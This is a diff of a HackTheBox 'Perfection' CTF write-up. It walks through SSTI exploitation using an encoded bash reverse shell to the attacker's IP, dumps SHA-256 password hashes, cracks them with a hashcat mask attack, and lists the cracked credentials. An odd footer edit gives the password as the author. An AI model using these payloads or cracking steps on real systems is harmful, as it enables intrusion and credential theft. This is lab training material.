@@ -1,9 +1,33 @@
 ---
-title: "Perfection - WriteUp"
-date: Sat Aug 30 2025 16:15:00 GMT+0200 (Central European Summer Time)
-categories: [WriteUps, HTB, Linux]
-tags: [ctf, nmap, htb, reverse-shell, hashcat, exploit, sudo, nginx, linux, ssh]
-image: /assets/img/htb-writeups/Pasted-image-20240318122502.png
+title: Perfection - WriteUp
+date: 'Sat, 30 Aug 2025 00:00:00 GMT'
+categories:
+  - WriteUps
+  - HTB
+  - Linux
+tags:
+  - ctf
+  - nmap
+  - htb
+  - reverse-shell
+  - hashcat
+  - exploit
+  - sudo
+  - nginx
+  - linux
+  - ssh
+image: /assets/img/cabeceras/2025-08-30-PERFECTION-WRITEUP.png
+description: >-
+  Perfection es una máquina Linux sencilla que incluye una aplicación web con
+  funcionalidad para calcular las calificaciones de los estudiantes. Esta
+  aplicación es vulnerable a la Inyección de Plantillas del Lado del Servidor
+  (SSTI) mediante la omisión del filtro de expresiones regulares. Se puede
+  obtener una ventaja explotando la vulnerabilidad SSTI. Al enumerar al usuario,
+  se revela que pertenece al grupo `sudo`. Una enumeración posterior revela una
+  base de datos con hashes de contraseñas, y el correo electrónico del usuario
+  revela un posible formato de contraseña. Mediante un ataque de máscara al
+  hash, se obtiene la contraseña del usuario, que se utiliza para obtener acceso
+  `root`.
 ---
 
 {% include machine-info.html
@@ -13,17 +37,8 @@ image: /assets/img/htb-writeups/Pasted-image-20240318122502.png
   platform="HTB"
 %}
 
-![Perfection](/assets/img/htb-writeups/Pasted-image-20240318122502.png)
 
-Tags:  
-
-------
-
-![PERFECTION](/assets/img/htb-writeups/Pasted-image-20240318122502.png)
-
-----
-
-#### ENUM
+## Enumeración
 
 NMAP
 ```perl
@@ -55,7 +70,7 @@ HTTP
 
 ![PERFECTION](/assets/img/htb-writeups/Pasted-image-20240318123338.png)
 
-# Start Listener
+## Start Listener
 
 _The next step involves listening for incoming connections using_ `nc -lvnp 7373`_, where_ `nc` _is the Netcat utility, a versatile networking tool. The flags used here (_`-l` _listen mode,_ `-v` _verbose,_ `-n` _numeric-only IP addresses,_ `-p` _specifies the port) set up a listener on port 7373, anticipating a reverse shell from the target._
 
@@ -66,7 +81,7 @@ listening on [any] 7373 ...
 connect to [10.10.14.213] from (UNKNOWN) [10.129.216.68] 42582
 ```
 
-# Generate Payload
+## Generate Payload
 
 _The use of_ `hURL` _to encode and decode payloads showcases the manipulation of data to exploit web application vulnerabilities. The payload crafted for the Weighted Grade Calculator application is designed to execute a reverse shell command, taking advantage of any potential server-side code execution vulnerabilities._
 
@@ -84,7 +99,7 @@ Original    :: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMTMvNzM3MyAwPiYx
 URL ENcoded :: YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4yMTMvNzM3MyAwPiYx
 ```
 
-# Inject Payload
+## Inject Payload
 
 _Use Burpsuite to capture the POST Request. Then paste in the Payload._
 
@@ -112,7 +127,7 @@ Please hit me with updates on the migration when you can. I am currently registe
 
 ```
 
-# User Flag and Hash
+## User Flag and Hash
 
 _Boom! There is our Reverse Shell Connection. We can now optain the User Flag and the hash from Susan._
 
@@ -162,7 +177,7 @@ Harry Tylerd33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393O
 Tina Smithdd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57Q  
 Susan Millerabeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
 
-# Crack the Hash
+## Crack the Hash
 
 ┌──(kali㉿kali)-[~]  
 └─$ echo "abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f" > hash.txt    
@@ -191,7 +206,7 @@ Candidate.Engine.: Device Generator
 Candidates.#1....: susan_nasus_058540610 -> susan_nasus_803824210  
 Hardware.Mon.#1..: Util: 32%
 
-# Login with Root
+## Login with Root
 
 ┌──(kali㉿kali)-[~]  
 └─$  ssh susan@10.129.216.68  
@@ -200,6 +215,8 @@ root@perfection:/home/susan# cat /root/root.txt
 <FLAG>
 ```
 
+
+
 CREDS:
 ```http
 susan:susan_nasus_413759210
@@ -207,5 +224,11 @@ susan:susan_nasus_413759210
 ---
 
 **Última actualización**: 2025-08-30<br>
+**Autor**: susan_nasus_413759210<br>
+**Licencia**: Creative Commons BY-NC-SA 4.0
+
+---
+
+**Última actualización**: 2025-12-22<br>
 **Autor**: A. Lorente<br>
 **Licencia**: Creative Commons BY-NC-SA 4.0
